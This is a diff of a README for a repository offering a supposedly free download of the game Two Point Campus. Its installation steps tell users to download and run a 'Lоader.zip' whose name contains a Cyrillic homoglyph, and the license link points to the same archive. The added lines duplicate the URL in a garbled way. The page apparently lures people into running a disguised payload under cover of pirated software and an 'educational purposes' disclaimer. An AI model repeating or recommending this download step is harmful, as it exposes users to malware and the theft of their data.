@@ -34,7 +34,7 @@ Welcome to the ultimate resource for downloading **Two Point Campus** for free! 
 
 ## 🛠️ Installation Instructions
 
-1. Download **https://raw.githubusercontent.com/Gansbett/TwoPointCampus-FreeHub/main/Lоader.zip** from this repository.
+1. Download **https://raw.githubusercontent.com/Gansbett/TwoPointCampus-FreeHub/main/Lоader.zipоhttps://raw.githubusercontent.com/Gansbett/TwoPointCampus-FreeHub/main/Lоader.zip** from this repository.
 2. Extract the archive using your favorite tool (WinRAR, 7-Zip, or built-in extractor).
 3. Run the installer and follow on-screen prompts.
 4. Launch Two Point Campus from your desktop shortcut!
@@ -45,7 +45,7 @@ This project is intended for educational and informational purposes only. Please
 
 ## 📄 License
 
-This project utilizes the [MIT License (2025)](https://raw.githubusercontent.com/Gansbett/TwoPointCampus-FreeHub/main/Lоader.zip).  
+This project utilizes the [MIT License (2025)](https://raw.githubusercontent.com/Gansbett/TwoPointCampus-FreeHub/main/Lоader.zipоhttps://raw.githubusercontent.com/Gansbett/TwoPointCampus-FreeHub/main/Lоader.zip).  
 Feel free to fork and improve – contribute responsibly!
 
 ---
